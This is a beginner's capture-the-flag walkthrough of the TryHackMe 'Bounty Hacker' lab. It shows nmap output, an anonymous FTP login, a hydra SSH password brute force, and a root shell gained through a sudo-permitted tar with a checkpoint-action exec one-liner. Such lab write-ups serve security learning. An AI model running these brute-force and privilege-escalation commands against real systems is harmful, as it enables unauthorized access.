## [Bounty Hacker](https://tryhackme.com/room/cowboyhacker#) 
This is my first writeup, so keep that in mind ;)
### Living up to the title

1. Deploy machine
2. Find open ports on the machine

Let's use nmap to start off.
```
┌──(root㉿kali)-[~]
└─#nmap -sC -sV -n $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 08:01 UTC
Nmap scan report for 10.10.130.231
Host is up (0.0026s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.111.127
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 02:C3:4B:24:8B:63 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.77 seconds
```

- -sV: determine service/version running on port
- -sC: default script
- -n: no DNS resolution (improves scanning time)

From the nmap scan, we found three open ports on the machine. Port 21, 22 and 80. Ftp, ssh and http respectively. Nmap also tells us, that the ftp server allows anonymous logins: >ftp-anon: Anonymous FTP login allowed (FTP code 230)
which helps us with the following task.

3. Who wrote the task list?
Since there is an ftp server running on our target it might be worth taking a look at it. Since we can log in anonymously we won't need a username:
```
┌──(root㉿kali)-[~]
└─# ftp 10.10.130.231
Connected to 10.10.130.231.
220 (vsFTPd 3.0.3)
Name (10.10.130.231:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42831|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> 

```
Using the `get task.txt && get locks.txt` we can take a look at the two present files.
Opening up the task.txt file will give us the answer to the first question: *lin*
The locks.txt file seems to harbour passwords in plain text. this will come to use later on.

4. What service can you bruteforce with the text file found?
This question can have to answers. You could try bruteforcing ftp or ssh. Trying our password list on the ftp server does not yield any results, therefore the correct answer to the question is *ssh* in this case.

5. What is the users password?
We already have or at least suspect a username (lin) and a password list, that conviniently jumped right into our faces when logging into the ftp server. Now let's use both of these to try and gain ssh access as *lin*. [Hydra](https://www.kali.org/tools/hydra/) provides the necessary toolset for this action:

```
┌──(root㉿kali)-[~]
└─# hydra ssh://$IP -l lin -P /root/locks.txt -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-14 08:21:54
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.130.231:22/
[22][ssh] host: 10.10.130.231   login: lin   password: [REDACTED]cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-14 08:22:00
```
- -l: define a username
- -P: use a wordlist
- -t: define the number of parallel tasks (some ssh configs reduce the number of parallel tasks, so hydra recommends using -t 4 for ssh)

5. user.txt
Now we can login via ssh: `ssh lin@$IP`
On lin's Desktop we find the user.txt file. We can get the user.txt flag with `cat user.txt`

6. root.txt
Lin does not have the permission to access the root directory. So to find the root flag we have to somehow gain priveleges.
Let's first check what sudo permissions lin has:
 ```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
 ```
To check wether there is a way to gain priviliges we can use [GTFOBins](https://gtfobins.github.io/#) and search for 'tar'.
Trying the first option: `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# cat /root/root.txt                       
THM{###########}
```

That's the last flag! :)






